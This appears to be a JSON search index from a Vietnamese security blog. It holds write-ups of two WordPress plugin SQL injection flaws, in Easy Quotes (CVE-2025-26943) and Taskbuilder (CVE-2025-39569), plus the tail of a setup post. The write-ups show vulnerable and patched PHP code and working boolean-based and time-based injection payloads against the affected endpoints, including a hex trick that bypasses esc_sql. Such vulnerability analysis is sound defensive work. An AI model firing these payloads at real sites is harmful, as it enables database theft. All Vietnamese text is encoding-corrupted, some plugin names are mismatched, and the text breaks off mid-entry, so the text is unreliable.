trá»£ phÃ¡t triá»ƒn plugin: Plugin tá»± viáº¿t kÃ¨m nhiá»u thÆ° viá»‡n/asset cÃ³ thá»ƒ khÃ¡ náº·ng, viá»‡c tÄƒng giá»›i háº¡n giÃºp test dá»… dÃ ng hÆ¡n.\nHow to Increase Plugin Upload Size Sá»­a php.ini (náº¿u cÃ³ quyá»n server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sá»­a file .htaccess (náº¿u dÃ¹ng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 ThÃªm vÃ o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); ğŸ‘‰ Lá»i khuyÃªn: Chá»‰ nÃªn Ä‘áº·t giá»›i háº¡n vá»«a Ä‘á»§ (64MB hoáº·c 128MB). TrÃ¡nh Ä‘áº·t quÃ¡ lá»›n Ä‘á»ƒ háº¡n cháº¿ nguy cÆ¡ bá»‹ upload file náº·ng gÃ¢y quÃ¡ táº£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦\u003c/li\u003e\n\u003cli\u003eHiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCÃ³ 2 phiÃªn báº£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Easy Quotes cá»§a WordPress trÆ°á»›c phiÃªn báº£n 1.2.3. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) vÃ  v1.2.3(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  khÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡ khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nBáº£n vÃ¡ sá»­ dá»¥ng $wpdb-\u0026gt;prepare() thay vÃ¬ truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } CÃ³ nhiá»u hÃ m cÅ©ng Ä‘Æ°á»£c vÃ¡ báº±ng cÃ¡ch trÃªn, nhÆ°: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() Ä‘Ã£ Ä‘Æ°á»£c vÃ¡ nhÆ°ng nÃ³ khÃ´ng chá»©a dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng, nÃªn khÃ´ng cáº§n quan tÃ¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it work? Ta khai thÃ¡c lá»—i SQL Injection trong hÃ m get_family_data($family), cÃ¡c hÃ m cÃ²n láº¡i khai thÃ¡c tÆ°Æ¡ng tá»±.\nget_family_data() lÃ  hÃ m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() Ä‘Æ°á»£c gá»i trong 2 hÃ m get_family() vÃ  get_font_variants() cá»§a class Quotes_Data, Ä‘á»ƒ biáº¿t chÃºng sá»­ dá»¥ng á»Ÿ Ä‘Ã¢u, ta tÃ¬m kiáº¿n vá»›i tá»« khÃ³a get_family hoáº·c get_font_variants\nHÃ m get_font_variants() Ä‘Æ°á»£c gá»i trong hÃ m rest_route_callback_font_variants() cá»§a class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } HÃ m khá»Ÿi táº¡o cá»§a class Quotes_Rest_Route sá»­ dá»¥ng add_action(hook_name, callback) vá»›i hook_name lÃ  rest_api_init Ä‘á»ƒ Ä‘Äƒng kÃ½ cÃ¡c endpoint tÃ¹y chá»‰nh vá»›i REST API System cá»§a WordPress\nCallback rest_api_init sá»­ dá»¥ng register_rest_route nhiá»u láº§n Ä‘á»ƒ táº¡o cÃ¡c endpoint dÆ°á»›i namespace layart/v1\nrest_route_callback_font_variants lÃ  callback cá»§a endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family máº·c Ä‘á»‹nh lÃ  Shadows Into Light náº¿u khÃ´ng Ä‘Æ°á»£c truyá»n trong param.\nExploit Detect SQLi Ta thá»­ ká»¹ thuáº­t Boolean-based SQL Injection Ä‘á»ƒ kiá»ƒm tra xem tham sá»‘ family cÃ³ dá»… bá»‹ chÃ¨n lá»‡nh SQL hay khÃ´ng.\nTrue request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='1' luÃ´n Ä‘Ãºng =\u0026gt; query há»£p lá»‡, tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng.\nFalse request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='2' luÃ´n sai =\u0026gt; query khÃ´ng khá»›p =\u0026gt; tráº£ vá» [].\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nDatabase name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w {: .prompt-info }\nResponse tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng =\u0026gt; kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nKhi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Automatic Extraction Dá»±a trÃªn kÄ© thuáº­t boolean base ta viáº¿t script Ä‘á»ƒ tá»± Ä‘á»™ng khai thÃ¡c.\nScript Here\nConclusion Lá»— há»•ng CVE-2025-26943 trong plugin WordPress Easy Quotes trÆ°á»›c phiÃªn báº£n 1.2.3 xuáº¥t phÃ¡t tá»« viá»‡c khÃ´ng sá»­ dá»¥ng cÆ¡ cháº¿ chuáº©n bá»‹ truy váº¥n ($wpdb-\u0026gt;prepare) mÃ  truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u lá»‡nh SQL dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nBáº£n vÃ¡ chÃ­nh thá»©c Ä‘Ã£ thay tháº¿ viá»‡c ná»‘i chuá»—i báº±ng cÃ¡ch dÃ¹ng $wpdb-\u0026gt;prepare, giÃºp Ä‘áº£m báº£o dá»¯ liá»‡u Ä‘áº§u vÃ o Ä‘Æ°á»£c kiá»ƒm soÃ¡t vÃ  an toÃ n hÆ¡n.\nKey takeaways:\nLuÃ´n sá»­ dá»¥ng $wpdb-\u0026gt;prepare() khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection. ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-23-cve-2025-26943/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) vÃ  v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  \u003cstrong\u003ekhÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡\u003c/strong\u003e khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Taskbuilder cá»§a WordPress trÆ°á»›c phiÃªn báº£n 4.0.2. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) vÃ  v4.0.2(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n '...'. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° OR, AND,...) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/admin/projects/get_users.php\nTrong phiÃªn báº£n v4.0.1, biáº¿n $proj_id sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); á» báº£n v4.0.2, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t $proj_id trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ $proj_id sau khi escape Ä‘Æ°á»£c coi lÃ  má»™t chuá»—i literal, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.\nHow it work? File architecture:\nCáº¥u trÃºc chung cá»§a file hiá»‡n táº¡i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal ob_start(); // ... render HTML danh sÃ¡ch users $body = ob_get_clean(); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal ob_start(); // ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save) $footer = ob_get_clean(); // Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Láº¥y dá»¯ liá»‡u project tá»« database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o biáº¿n. $body / $footer: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal. json_encode(): Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang. File náº±m trong thÆ° má»¥c includes cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a get_users.php trong thÆ° má»¥c chá»©a plugin.\nğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m wppm_get_users() cá»§a class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() lÃ  callback cá»§a action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. wp_ajax_wppm_get_users lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn: wp_ajax_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p. wp_ajax_nopriv_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p. á» Ä‘Ã¢y, action = wppm_get_users. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i action=wppm_get_users tá»›i admin-ajax.php, thÃ¬ WordPress sáº½ tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½, á»Ÿ Ä‘Ã¢y lÃ  wppm_get_users(). ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c action = wppm_get_users, kiá»ƒm tra xem Ajax nÃ o sá»­ dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a wppm_get_users trÃªn cÃ¡c file .js trong thÆ° má»¥c chá»©a plugin.\nAction wppm_get_users lÃ  pháº§n data trong request POST cá»§a hÃ m wppm_get_users()\nHÃ m wppm_get_users() sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a chá»©c nÄƒng project\nTáº¡o project má»›i Truy cáº­p vÃ o project Ä‘Ã³ Inspect code vÃ  tÃ¬m hÃ m wppm_get_users sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³ ğŸ‘‰ Khi click vÃ o icon bÃªn cáº¡nh Users ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.\nExploit Detect SQLi Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id Ä‘Ãºng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  0x77\nSá»­ dá»¥ng SUBSTRING(STRING,1,1) Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i\ná» Ä‘Ã¢y, $proj_id báº±ng 4 vÃ¬ SUBSTRING('wordpress',1,1)=0x77 lÃ  Ä‘Ãºng nÃªn SELECT láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong IF(condition, value if true, value if false), 4 lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n\nSá»­ dá»¥ng HEX technique Ä‘á»ƒ bypass hÃ m esc_sql() á»Ÿ trÃªn, dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c '\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Vá»›i proj_id khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a None\nğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t boolean base\nproj_id Ä‘Ã¹ng: response khÃ´ng chá»©a None proj_id sai: response chá»©a None CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t time base nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u\nConclusion Lá»— há»•ng CVE-2025-39569 trong plugin WordPress Taskbuilder xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n '...' bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.\nBáº£n vÃ¡ á»Ÿ phiÃªn báº£n 4.0.2 Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a $proj_id vÃ o trong '...', Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.\nKey takeaways:\nÆ¯u tiÃªn sá»­ dá»¥ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query. Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng cÃ¡c Ajax endpoint vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t. NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL 